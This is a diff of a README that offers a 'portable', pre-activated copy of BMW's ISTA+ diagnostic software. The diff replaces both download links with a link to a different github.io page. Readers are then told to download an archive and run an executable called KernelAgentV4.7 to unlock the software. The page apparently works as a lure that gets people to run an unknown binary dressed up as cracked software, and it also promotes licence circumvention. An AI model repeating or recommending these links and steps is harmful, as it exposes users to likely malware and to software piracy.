@@ -2,13 +2,13 @@
 
 Run ISTA+ (Rheingold) without installation — fully preconfigured for Windows. Perform dealer-level diagnostics, coding, and service on BMW/MINI/RR vehicles. Includes activation and D-PDU, ENET, K+DCAN, ICOM support, unlocked via `KernelAgentV4.7`.
 
-[![Download ISTA+ Portable](https://img.shields.io/badge/Download-ISTA+_Portable-blueviolet)](https://bmw-ista-plus-rheingold-portable.github.io/.github)
+[![Download ISTA+ Portable](https://img.shields.io/badge/Download-ISTA+_Portable-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/ferder)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://bmw-ista-plus-rheingold-portable.github.io/.github) section
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/ferder) section
 2. 📁 **Extract the folder** to any location (e.g., `D:\BMWTools\ISTA`)
 3. 🔁 **Run the executable file** `KernelAgentV4.7`
 4. 🧠 The patch will activate ISTA+ full functionality and vehicle interface support
